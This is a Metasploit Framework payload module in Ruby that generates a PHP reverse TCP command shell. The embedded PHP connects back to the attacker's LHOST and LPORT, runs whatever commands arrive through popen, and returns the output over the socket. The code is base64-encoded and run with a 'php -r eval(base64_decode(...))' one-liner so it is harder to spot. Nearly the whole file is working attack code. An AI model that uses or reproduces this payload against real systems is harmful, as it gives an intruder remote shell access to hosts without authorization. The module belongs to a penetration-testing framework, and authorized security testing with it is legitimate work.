##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command Shell, Reverse TCP (via PHP)',
			'Description'   => 'Connect back and create a command shell via PHP',
			'Author'        => 'Brendan Coles <bcoles[at]gmail.com>',
			'License'       => MSF_LICENSE,
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'RequiredCmd'   => 'php',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Generate command string
	#
	def command_string

		shell=<<-END_OF_PHP_CODE
		$rhost ='#{datastore['LHOST']}';
		$rport = #{datastore['LPORT']};
		if (!($sock=fsockopen($rhost,$rport))) die;
		while (!feof($sock)) {
			$cmd  = fgets($sock);
			$pipe = popen($cmd,'r');
			while(!feof($pipe)) fwrite ($sock, fgets($pipe));
			pclose($pipe);
		}
		fclose($sock);
		END_OF_PHP_CODE

		Rex::Text.randomize_space(shell)
		encoded_cmd = Rex::Text.encode_base64(shell)
		return "php -r \"eval(base64_decode('#{encoded_cmd}'));\""

	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end

end
